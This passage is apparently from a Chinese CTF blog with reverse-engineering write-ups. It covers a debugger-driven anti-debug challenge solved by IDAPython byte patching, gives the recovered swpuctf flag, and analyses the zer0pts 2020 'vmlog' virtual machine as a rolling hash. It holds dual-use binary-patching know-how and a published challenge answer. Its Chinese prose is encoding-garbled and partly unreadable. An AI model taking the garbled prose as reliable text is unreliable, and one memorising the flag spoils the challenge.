dwContinueStatus = <span class="number">65538</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">30</span>:                      <span class="comment">// v15 ä¸­çš„ 30 å­—èŠ‚æ•°æ®å†™å…¥lpBaseAddress</span></span><br><span class="line">                    WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, v15, <span class="number">0x1Eu</span>, NumberOfBytesWritten);</span><br><span class="line">                    <span class="keyword">if</span> ( NumberOfBytesWritten[<span class="number">0</span>] == <span class="number">30</span> )</span><br><span class="line">                      dwContinueStatus = <span class="number">65538</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">                  <span class="keyword">default</span>:                      <span class="comment">// iï¼=4ï¼Œ5ï¼Œ7ï¼Œ30</span></span><br><span class="line">                    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              dwContinueStatus = <span class="number">0x80010001</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">            ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, <span class="number">0x10002u</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">            v5 = <span class="number">0</span>;</span><br><span class="line">            ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, <span class="number">0x10002u</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">            ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, <span class="number">0x10002u</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">LABEL_33:</span><br><span class="line">            ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, dwContinueStatus);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_F53922();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sub-F58A40"><a href="#sub-F58A40" class="headerlink" title="sub_F58A40"></a>sub_F58A40</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">text:00F58AF8                 int     3               ; Trap to Debugger</span><br><span class="line">text:00F58AF9                 nop</span><br><span class="line">text:00F58AFA                 nop</span><br><span class="line">text:00F58AFB                 nop</span><br><span class="line">text:00F58AFC                 nop</span><br><span class="line">text:00F58AFD                 nop</span><br><span class="line">text:00F58AFE                 nop</span><br><span class="line">text:00F58AFF                 push    offset aYouAreTooShort ; &quot;you are too short!&quot;</span><br><span class="line">text:00F58B04                 call    printf</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œé‡åˆ°int 3ä¼šå†™å…¥v16 7å­—èŠ‚çš„æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7</span>:                      </span><br><span class="line">                   WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, v16, <span class="number">7u</span>, NumberOfBytesWritten);</span><br><span class="line">                   <span class="keyword">if</span> ( NumberOfBytesWritten[<span class="number">0</span>] == <span class="number">7</span> )</span><br><span class="line">                   &#123;</span><br><span class="line">                     ReadProcessMemory(ProcessInformation.hProcess, lpBaseAddress, Buffer, <span class="number">7u</span>, NumberOfBytesRead);</span><br><span class="line">                     dwContinueStatus = <span class="number">65538</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">goto</span> LABEL_33;</span><br></pre></td></tr></table></figure><p>paste dataå°±è¡Œ</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501051651130.png" alt="image"></p><h4 id="sub-F587E0"><a href="#sub-F587E0" class="headerlink" title="sub_F587E0"></a>sub_F587E0</h4><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501080247609.png" alt="1736275603403.png"></p><p>30å­—èŠ‚çš„æœ‰ç‚¹é•¿ï¼Œidapythonå§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–çš„å­—èŠ‚ä½ç½®èŒƒå›´ï¼šä» 0xF58C45 åˆ° 0xF58D10</span></span><br><span class="line">start_addr = <span class="number">0x00F58C45</span>  <span class="comment"># èµ·å§‹åœ°å€</span></span><br><span class="line">end_addr = <span class="number">0x00F58D10</span>    <span class="comment"># ç»“æŸåœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­˜å‚¨å­—èŠ‚çš„åˆ—è¡¨</span></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æŒ‡å®šåœ°å€èŒƒå›´</span></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(start_addr, end_addr + <span class="number">1</span>):  <span class="comment"># æŒ‰å­—èŠ‚é€ä¸ªè¯»å–</span></span><br><span class="line">    byte = idaapi.get_byte(addr)  <span class="comment"># è·å–å½“å‰åœ°å€çš„å­—èŠ‚</span></span><br><span class="line">    <span class="keyword">if</span> byte != -<span class="number">1</span>:  <span class="comment"># ç¡®ä¿å­—èŠ‚æœ‰æ•ˆ</span></span><br><span class="line">        data.append(byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªæå–å­˜å‚¨åˆ°å†…å­˜ä¸­çš„å­—èŠ‚ï¼ˆæ¯æ¡ mov æŒ‡ä»¤çš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼‰</span></span><br><span class="line">stored_values = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data) - <span class="number">6</span>, <span class="number">7</span>):  <span class="comment"># æ¯æ¡æŒ‡ä»¤ä¸º 7 å­—èŠ‚ï¼Œç¡®ä¿æœ‰è¶³å¤Ÿå­—èŠ‚</span></span><br><span class="line">    stored_values.append(data[i + <span class="number">6</span>])  <span class="comment"># å­˜å‚¨æ¯æ¡ mov æŒ‡ä»¤çš„æœ€åä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æå–çš„å­˜å‚¨å­—èŠ‚å€¼ä½œä¸ºæ•°ç»„</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Stored values in array:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[&quot;</span> + <span class="string">&quot;, &quot;</span>.join(<span class="string">&quot;0x&#123;:02X&#125;&quot;</span>.<span class="built_in">format</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> stored_values) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[0x90, 0x0F, 0xB6, 0x55, 0xF7, 0x8B, 0x45, 0x08, 0x8B, 0x04, 0x90, 0x0F, 0xAF, 0x45, 0xFC, 0x33, 0xD2, 0xF7, 0x75, 0xF8, 0x0F, 0xB6, 0x4D, 0xF7, 0x8B, 0x45, 0x0C, 0x89, 0x14ï¼Œ0x88]</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span>*</span><br><span class="line">data=[<span class="number">0x90</span>, <span class="number">0x0F</span>, <span class="number">0xB6</span>, <span class="number">0x55</span>, <span class="number">0xF7</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x90</span>, <span class="number">0x0F</span>, <span class="number">0xAF</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x33</span>, <span class="number">0xD2</span>, <span class="number">0xF7</span>, <span class="number">0x75</span>, <span class="number">0xF8</span>, <span class="number">0x0F</span>, <span class="number">0xB6</span>, <span class="number">0x4D</span>, <span class="number">0xF7</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x89</span>, <span class="number">0x14</span>,<span class="number">0x88</span>]</span><br><span class="line">b=<span class="number">0x0F58824</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    ida_bytes.patch_byte(b+i,data[i])</span><br></pre></td></tr></table></figure><p>ä¿®å®Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_F587E0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 i; <span class="comment">// [esp+3h] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8u</span>; ++i )</span><br><span class="line">    *(a2 + <span class="number">4</span> * i) = <span class="number">41</span> * *(a1 + <span class="number">4</span> * i) % <span class="number">0x1EBu</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜è¦ä¸ªin3+3ä¸ªnopï¼Œæ ¹æ®ä¸»å‡½æ•°åˆ†æä¸ç®¡å®ƒ</p><h4 id="sub-F583C0"><a href="#sub-F583C0" class="headerlink" title="sub_F583C0"></a>sub_F583C0</h4><p>in3+4ä¸ªnopï¼Œå¯¹åº”case4ï¼Œmainé‡Œçš„å¤„ç†æ˜¯eip+1è·³è¿‡å¼‚å¸¸</p><p><del>åœ¨int3é‚£é‡Œä¸‹ä¸ªæ–­ç‚¹ï¼ŒåŠ¨è°ƒä¸€ä¸‹çœ‹çœ‹ç¨‹åºå’‹å¤„ç†è¿™é‡Œçš„</del></p><p>å¿˜äº†åŒçº¿ç¨‹äº†ï¼Œapply patch to programmï¼Œç„¶åè¿è¡Œä¸€ä¸‹exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:0069842B                               ;   __try &#123; // __except at loc_69845A</span><br><span class="line">.text:0069842B C7 45 FC 00 00 00 00          mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">.text:00698432 CC                            int     3                               ; Trap to Debugger</span><br><span class="line">.text:00698433 90                            nop</span><br><span class="line">.text:00698434 90                            nop</span><br><span class="line">.text:00698435 90                            nop</span><br><span class="line">.text:00698436 90                            nop</span><br><span class="line">....</span><br><span class="line">.text:0069845A                               loc_69845A:                             ; DATA XREF: .rdata:stru_7783E8â†“o</span><br><span class="line">.text:0069845A                               ;   __except(loc_698454) // owned by 69842B</span><br><span class="line">.text:0069845A 8B 65 E8                      mov     esp, [ebp+ms_exc.old_esp]</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥è·³åˆ°äº†loc_69845Aï¼Œæœ‰ç‚¹åƒå¯†æ–‡å¯†é’¥ä¹‹ç±»çš„ï¼ŒåŒæ ·çš„æˆ‘ä»¬keypatch in3 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 3 -&gt; jmp loc_69845A</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è§£å¯†äº†ï¼ŒèƒŒåŒ…åŠ å¯†ç½‘ä¸Šéšä¾¿æ‰¾ä¸ªè„šæœ¬æ”¹æ”¹</p><p>swpuctf{y0u_@re_s0_coo1}</p><h2 id="zer0pts-2020-vmlogï¼ˆvmï¼‰"><a href="#zer0pts-2020-vmlogï¼ˆvmï¼‰" class="headerlink" title="[zer0pts 2020]vmlogï¼ˆvmï¼‰"></a>[zer0pts 2020]vmlogï¼ˆvmï¼‰</h2><p><a href="https://www.nssctf.cn/problem/61">[zer0pts 2020]vmlog | NSSCTF</a></p><p>æ‹¿åˆ°vm.pyå’Œlog.txtï¼Œvm.pyå®ç°äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„æŒ‡ä»¤é›†ï¼Œè¡Œä¸ºå–å†³äºprogramå˜é‡å’Œè¾“å…¥ã€‚åšvmé¢˜çš„å¸¸è§„æ€è·¯å°±æ˜¯æŠŠæ±‡ç¼–æ‰“å°å‡ºæ¥çœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> program <span class="keyword">import</span> program</span><br><span class="line"></span><br><span class="line">reg = <span class="number">0</span></span><br><span class="line">mem = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line">buf = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(program)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> pc &lt; <span class="built_in">len</span>(program):</span><br><span class="line">    op = program[pc]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        reg += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> add reg 1 #reg=<span class="subst">&#123;reg&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        reg -= <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> sub reg 1 #reg=<span class="subst">&#123;reg&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">        reg *= mem[p]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> mul reg mem[<span class="subst">&#123;p&#125;</span>] #reg=<span class="subst">&#123;reg&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;%&quot;</span>:</span><br><span class="line">        reg = mem[p] % reg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> mod reg mem[<span class="subst">&#123;p&#125;</span>] #reg=<span class="subst">&#123;reg&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        reg = mem[p]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> mov reg mem[<span class="subst">&#123;p&#125;</span>] #reg=<span class="subst">&#123;reg&#125;</span>,p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;s&quot;</span>:</span><br><span class="line">        mem[p] = reg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> mov mem[<span class="subst">&#123;p&#125;</span>] reg #mem=<span class="subst">&#123;mem&#125;</span>,p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        p = (p + <span class="number">1</span>) % <span class="number">10</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> inc p 1 #p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;&lt;&quot;</span>:</span><br><span class="line">        p = (p - <span class="number">1</span>) % <span class="number">10</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> dec p 1 #p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        a = sys.stdin.buffer.read(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> getchar&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">            reg = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> mov, reg 0 #reg=<span class="subst">&#123;reg&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            reg += <span class="built_in">ord</span>(a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> mov, reg <span class="subst">&#123;<span class="built_in">ord</span>(a)&#125;</span> #input #reg=<span class="subst">&#123;reg&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">        buf += <span class="built_in">str</span>(reg)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> buf+=str(reg)&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;[&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> cmp reg 0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg == <span class="number">0</span>:</span><br><span class="line">            cnt = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> cnt != <span class="number">0</span>:</span><br><span class="line">                pc += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> program[pc] == <span class="string">&quot;[&quot;</span>:</span><br><span class="line">                    cnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> program[pc] == <span class="string">&quot;]&quot;</span>:</span><br><span class="line">                    cnt -= <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> jz &quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;]&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> cmp reg 0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg != <span class="number">0</span>:</span><br><span class="line">            cnt = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> cnt != <span class="number">0</span>:</span><br><span class="line">                pc -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> program[pc] == <span class="string">&quot;[&quot;</span>:</span><br><span class="line">                    cnt -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> program[pc] == <span class="string">&quot;]&quot;</span>:</span><br><span class="line">                    cnt += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span> jnz &quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(mem)</span><br><span class="line"></span><br><span class="line">    pc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(buf)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line"><span class="comment">#print(f&quot;PC: &#123;pc&#125;, OP: &#123;op&#125;, REG: &#123;reg&#125;, MEM: &#123;mem&#125;, P: &#123;p&#125;, BUF: &#x27;&#123;buf&#125;&#x27;&quot;)</span></span><br></pre></td></tr></table></figure><p>ç»™çš„log.txtæ˜¯program+è¿è¡Œæ—¥å¿—</p><p>è‡ªå·±å†å®šä¹‰ä¸€ä¸ªprogram.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program = <span class="string">&quot;M+s+&gt;s&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[s&lt;&lt;l&gt;*&lt;s&gt;&gt;l-]&lt;&lt;l-s&gt;l*-s*-s*-s*-s*-s*-s&gt;l*+++++s*-----s****s&gt;&gt;l+s[Ml-s&lt;&lt;l&gt;,[&lt;&lt;*&gt;&gt;s&lt;&lt;&lt;l&gt;&gt;&gt;%&lt;s&gt;&gt;l&lt;s&gt;l+s&lt;l]&gt;l]&lt;&lt;lp&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M+s+&gt;s&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[s&lt;&lt;l&gt;*&lt;s&gt;&gt;l-]&lt;&lt;l-s</span><br><span class="line">&gt;l*-s*-s*-s*-s*-s*-s</span><br></pre></td></tr></table></figure><ul><li><p><strong><code>M</code></strong>ï¼šæ‰“å°åˆå§‹å†…å­˜çŠ¶æ€ï¼Œä¾¿äºè°ƒè¯•ã€‚</p></li><li><p><code>s</code> å’Œ <code>l</code></p><p>ï¼šå°†å€¼å­˜å‚¨åˆ°å†…å­˜æˆ–åŠ è½½åˆ°å¯„å­˜å™¨ã€‚</p><ul><li><code>mem[0]</code> è¢«è®¾ç½®ä¸ºä¸€ä¸ªå¤§å€¼ï¼ˆ262âˆ’12^{62} - 1262âˆ’1ï¼‰ï¼Œé€šå¸¸ç”¨äºæ¨¡è¿ç®—ã€‚</li><li><code>mem[1]</code> è¢«è®¾ç½®ä¸º 2ï¼ˆåŸºæ•° <code>r</code>ï¼‰ã€‚</li><li><code>mem[2]</code> è¢«è®¾ç½®ä¸º 1ï¼ˆåˆå§‹å“ˆå¸Œå€¼ <code>h</code>ï¼‰ã€‚</li></ul></li><li><p>æ¨æ–­</p><ul><li>è¿™ç§åˆå§‹åŒ–æ–¹å¼éå¸¸å…¸å‹ï¼Œå¸¸è§äºæ»šåŠ¨å“ˆå¸Œç®—æ³•çš„å®ç°ã€‚</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,[&lt;&lt;*&gt;&gt;s&lt;&lt;&lt;l&gt;&gt;&gt;%&lt;s</span><br></pre></td></tr></table></figure><ul><li><strong><code>[ ,</code></strong>ï¼šå¼€å§‹è¯»å–è¾“å…¥å­—ç¬¦ã€‚</li><li><strong><code>&lt;&lt;\*</code></strong>ï¼šå½“å‰å“ˆå¸Œå€¼ <code>h</code> åŠ ä¸Šè¾“å…¥å­—ç¬¦åï¼Œä¹˜ä»¥åŸºæ•° <code>r</code>ã€‚</li><li><strong><code>%</code></strong>ï¼šå¯¹æ¨¡æ•° <code>m</code> å–æ¨¡ï¼Œé˜²æ­¢å“ˆå¸Œå€¼æº¢å‡ºã€‚</li><li>æ¨æ–­<ul><li>è¿™æ˜¯æ»šåŠ¨å“ˆå¸Œç®—æ³•çš„æ ¸å¿ƒå…¬å¼ï¼š h=(h+input)â‹…rmodâ€‰â€‰mh = (h + \text{input}) \cdot r \mod mh=(h+input)â‹…rmodm</li></ul></li></ul><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Ml-s&lt;&lt;l&gt;,[&lt;&lt;*&gt;&gt;s&lt;&lt;&lt;l&gt;&gt;&gt;%&lt;s&gt;&gt;l&lt;s&gt;l+s&lt;l]&gt;l]&lt;&lt;lp</span><br></pre></td></tr></table></figure><ul><li>å¾ªç¯æ ¸å¿ƒ<ul><li><code>[Ml-s&lt;&lt;l&gt;</code>ï¼šå¼€å§‹æ–°ä¸€è½®çš„å“ˆå¸Œå€¼æ›´æ–°ï¼Œæ ‡å¿—ä½æ§åˆ¶ã€‚</li><li><code>,[&lt;&lt;*&gt;&gt;s&lt;&lt;&lt;l&gt;&gt;&gt;%&lt;s</code>ï¼šå¯¹æ¯ä¸ªè¾“å…¥å­—ç¬¦è¿›è¡Œæ»šåŠ¨å“ˆå¸Œæ›´æ–°ã€‚</li><li><code>&gt;l+s&lt;l]</code>ï¼šè®¾ç½®æ ‡å¿—ä½ï¼Œç»§ç»­ä¸‹ä¸€è½®è¾“å…¥å¤„ç†ã€‚</li></ul></li><li>æ¨æ–­<ul><li>æ»šåŠ¨å“ˆå¸Œçš„æœ¬è´¨æ˜¯å¯¹è¾“å…¥å­—ç¬¦çš„é€ä¸ªå¤„ç†ï¼Œç»“åˆä¹˜æ³•ã€åŠ æ³•å’Œæ¨¡è¿ç®—ã€‚</li></ul></li></ul><h4 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;lp</span><br></pre></td></tr></table></figure><ul><li>ä½œç”¨<ul><li>è¾“å‡ºæœ€ç»ˆçš„å“ˆå¸Œå€¼ <code>h</code>ï¼ˆå­˜å‚¨åœ¨ 